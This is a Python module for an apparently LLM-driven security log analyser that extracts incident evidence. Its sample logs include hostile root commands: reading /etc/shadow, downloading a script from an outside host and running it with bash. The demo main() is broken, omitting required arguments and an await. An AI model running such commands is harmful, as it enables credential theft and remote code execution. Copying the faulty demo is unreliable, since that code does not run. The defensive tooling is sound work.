from openai import OpenAI
from app.prompts.prompts import LOG_ANALYSIS_SYSTEM_PROMPT
from app.schemas.analyze_incident_input_model import Evidence
from app.schemas.analyze_log_model import LogAnalysis, LogEvidence
from litellm import completion
from uuid import uuid4
import logging

from app.state.manager import InvestigationStateManager
from app.config.settings import get_settings




class AnalyzeLog():
    """This class is responsible for analyzing the logs sent in by the user for investigation"""

    def __init__(self, state_manager: InvestigationStateManager):
        self.APP_ENV = get_settings().app_env
        if self.APP_ENV == 'production':
            self.API_KEY = get_settings().api_key
        else:
            self.API_KEY = "ollama"
        self.MODEL = "ollama/gpt-oss:20b"
        self.state_manager = state_manager
        self.openai = OpenAI(base_url="http://localhost:11434/v1", api_key=self.API_KEY) if self.APP_ENV == 'development' else OpenAI(api_key=self.API_KEY)

    async def analyze(self, raw_logs: str, objective: str, investigation_id: str) -> LogAnalysis:
        user_prompt = f"""
        INVESTIGATION OBJECTIVE:

        <objective>
        {objective}
        </objective>

        RAW SECURITY LOGS:

        <logs>
        {raw_logs}
        </logs>

        Analyze the raw logs specifically for the investigation objective.

        Extract only evidence supported by the logs.

        Return ONLY the JSON object matching the required schema.
        """

        messages = [
            {
                "role": "system",
                "content": LOG_ANALYSIS_SYSTEM_PROMPT,
            },
            {
                "role": "user",
                "content": user_prompt,
            },
        ]

        response = completion(
            model=self.MODEL,
            messages=messages,
        )

        content = response.choices[0].message.content

        result = LogAnalysis.model_validate_json(content)

        await self.save_evidences(log_evidences=result.evidence, investigation_id=investigation_id)
        return result

    def normalize_log_evidence_to_evidence(self, log_evidence: LogEvidence) -> Evidence:
        evidence = Evidence(
            id=f"ev_{uuid4().hex}",
            type=log_evidence.key,
            source="logs",
            timestamp=(
                log_evidence.timestamp.isoformat()
                if log_evidence.timestamp
                else None
            ),
            content={"value": log_evidence.value},
        )
        return evidence
    
    async def save_evidences(self, log_evidences: list[LogEvidence], investigation_id: str) -> None:
        logging.info("Saving evidences")
        for log_evidence in log_evidences:
            evidence = self.normalize_log_evidence_to_evidence(log_evidence)
            await self.state_manager.add_evidence(investigation_id, evidence)
        logging.info("Evidences saved completely")

def main():
    analyze_log = AnalyzeLog()
    raw_logs = f"""
        2026-10-14T09:12:01Z prod-web-01 sshd[1421]: Failed password for invalid user admin from 203.0.113.42 port 49120 ssh2
        2026-10-14T09:12:04Z prod-web-01 sshd[1423]: Failed password for invalid user root from 203.0.113.42 port 49122 ssh2
        2026-10-14T09:12:07Z prod-web-01 sshd[1425]: Failed password for deploy from 203.0.113.42 port 49124 ssh2
        2026-10-14T09:12:10Z prod-web-01 sshd[1427]: Failed password for deploy from 203.0.113.42 port 49126 ssh2
        2026-10-14T09:12:13Z prod-web-01 sshd[1429]: Failed password for deploy from 203.0.113.42 port 49128 ssh2
        2026-10-14T09:12:16Z prod-web-01 sshd[1431]: Accepted password for deploy from 203.0.113.42 port 49130 ssh2
        2026-10-14T09:12:17Z prod-web-01 systemd-logind[801]: New session 94 of user deploy.
        2026-10-14T09:12:29Z prod-web-01 sudo[1450]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
        2026-10-14T09:12:36Z prod-web-01 sudo[1455]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
        2026-10-14T09:12:44Z prod-web-01 sudo[1461]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/diag.sh https://updates.example.org/diag.sh
        2026-10-14T09:12:50Z prod-web-01 sudo[1468]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/bash /tmp/diag.sh
        2026-10-14T09:13:05Z prod-web-01 sshd[1431]: Disconnected from user deploy 203.0.113.42 port 49130
    """
    objective = "Investigate suspicious SSH authentication activity on the production server. Identify potential brute-force attempts, successful unauthorized access, affected accounts, source IP addresses, suspicious post-login commands, and evidence of possible credential compromise or malicious execution. Distinguish confirmed log observations from unverified assumptions."
    analysed_log = analyze_log.analyze(raw_logs, objective)
    print(analysed_log)

if __name__ == "__main__":
    main()